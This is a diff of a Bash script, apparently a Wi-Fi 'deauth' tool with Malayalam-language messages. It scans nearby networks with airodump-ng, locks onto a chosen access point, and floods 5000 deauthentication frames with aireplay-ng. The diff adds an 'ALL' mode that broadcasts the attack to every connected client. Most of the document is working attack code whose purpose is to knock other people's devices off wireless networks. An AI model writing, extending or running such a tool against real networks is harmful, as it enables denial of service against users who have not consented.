@@ -2,7 +2,7 @@
 
 # Ensure the script is run as root
 if [ "$EUID" -ne 0 ]; then
-  echo -e "\n[-] Error: WiFi kalakki must be run with root privileges (sudo ./wifi-kalakki.sh)"
+  echo -e "\n[-] Error: WiFi kalakki must be run with root privileges (sudo ./pattas)"
   exit 1
 fi
 
@@ -60,8 +60,8 @@ while true; do
 
   case $CHOICE in
     1)
-      echo -e "\n[+] Starting Ayalokkath thalayidal..."
-      echo "[!] INSTRUCTION: Press Ctrl+C when you see your ayolakkathe kuttangal to stop thalayidal!"
+      echo -e "\n[+] Starting Wi-Fi Scanner..."
+      echo "[!] INSTRUCTION: Press Ctrl+C when you see your innathe era to stop scanning!"
       sleep 4
 
       rm -f /tmp/pattas_scan*
@@ -78,7 +78,7 @@ while true; do
         continue
       fi
 
-      echo -e "\n--- INNATHE EASHANI ---"
+      echo -e "\n--- INNATHE ERAKAL ---"
 
       # Columns: $1 = BSSID, $4 = channel, $14 = ESSID
       awk -F, '
@@ -127,7 +127,7 @@ while true; do
       airodump-ng --bssid "$SEL_BSSID" -c "$SEL_CHANNEL" -w /tmp/pattas_target --output-format csv "$MON_INTERFACE"
       trap cleanup SIGINT
 
-      echo -e "\n[+] Concentrated parathooshanam stopped. Parsing connected vallikal..."
+      echo -e "\n[+] Concentrated scan stopped. Parsing connected devices..."
 
       TARGET_CSV="/tmp/pattas_target-01.csv"
       if [ ! -f "$TARGET_CSV" ]; then
@@ -135,7 +135,7 @@ while true; do
         continue
       fi
 
-      echo -e "\n--- CONNECTED VALLIGAL ---"
+        echo -e "\n--- CONNECTED VALLIGAL ---"
 
       # Station section columns: $1 = Station MAC, $4 = Power
       awk -F, '
@@ -146,6 +146,9 @@ while true; do
           print "[" count "] Client MAC: " $1 " | Power: " $4
         }
       ' "$TARGET_CSV"
+
+      # Also print the "ALL" option after the list
+      echo "[0] ALL - Deauth all connected valligal"
 
       IFS=$'\n' CLIENT_MACS=($(awk -F, '
         BEGIN { in_station=0 }
@@ -159,14 +162,25 @@ while true; do
       fi
 
       echo ""
-      read -p "Select valli number: " CLIENT_NUM
+      read -p "Select valli number (0 for ALL): " CLIENT_NUM
 
-      if ! [[ "$CLIENT_NUM" =~ ^[0-9]+$ ]] || [ "$CLIENT_NUM" -lt 1 ] || [ "$CLIENT_NUM" -gt ${#CLIENT_MACS[@]} ]; then
+      # Validate input – allow "0" for ALL or a valid number in range
+      if ! [[ "$CLIENT_NUM" =~ ^[0-9]+$ ]]; then
         echo "[-] Invalid client selection."
         continue
       fi
 
-      SEL_CLIENT=$(echo "${CLIENT_MACS[$((CLIENT_NUM-1))]}" | tr -d '[:space:]')
+      if [ "$CLIENT_NUM" -eq 0 ]; then
+        # ALL mode — deauth without -c flag to broadcast and kick everyone
+        echo -e "\n[+] ALL mode selected. Kalakkan all valligal!..."
+        SEL_CLIENT="ALL"
+      elif [ "$CLIENT_NUM" -ge 1 ] && [ "$CLIENT_NUM" -le ${#CLIENT_MACS[@]} ]; then
+        # Single client mode
+        SEL_CLIENT=$(echo "${CLIENT_MACS[$((CLIENT_NUM-1))]}" | tr -d '[:space:]')
+      else
+        echo "[-] Invalid selection. Choose a number between 0 and ${#CLIENT_MACS[@]}."
+        continue
+      fi
 
       echo -e "\n[+] Client Locked successfully!"
       echo "    Target ESSID:  $SEL_ESSID"
@@ -174,15 +188,21 @@ while true; do
       echo "    Channel:       $SEL_CHANNEL"
       echo "    Client MAC:    $SEL_CLIENT"
       sleep 2
-      
+
       rm -f /tmp/pattas_deauth*
 
       trap - SIGINT
       echo -e "\n[+] Ente ettan pani thodanghi makkale...."
-      sudo aireplay-ng --deauth 5000 -a "$SEL_BSSID" -c "$SEL_CLIENT" "$MON_INTERFACE"
-      trap cleanup SIGINT
-    
-      
+
+      if [ "$SEL_CLIENT" = "ALL" ]; then
+        # Broadcast deauth — kicks every connected client
+        sudo aireplay-ng --deauth 5000 -a "$SEL_BSSID" "$MON_INTERFACE"
+      else
+        # Targeted deauth against a single client
+        sudo aireplay-ng --deauth 5000 -a "$SEL_BSSID" -c "$SEL_CLIENT" "$MON_INTERFACE"
+      fi
+
+      trap cleanup SIGINT     
       TARGET_CSV="/tmp/pattas_target-01.csv"
       if [ ! -f "$TARGET_CSV" ]; then
         echo "[-] Error: No target scan data captured."
@@ -192,7 +212,7 @@ while true; do
 
       echo -e "\n[+] Cleaning up monitor mode..."
       airmon-ng stop "$MON_INTERFACE" > /dev/null 2>&1
-      echo "[+] Bagavane ishwara nallath cheytha nallath kittane!.Exiting tool.!"
+      echo "[+] Exiting tool. Goodbye!"
       exit 0
       ;;
       2)
@@ -206,3 +226,4 @@ while true; do
       ;;
   esac
 done
+     
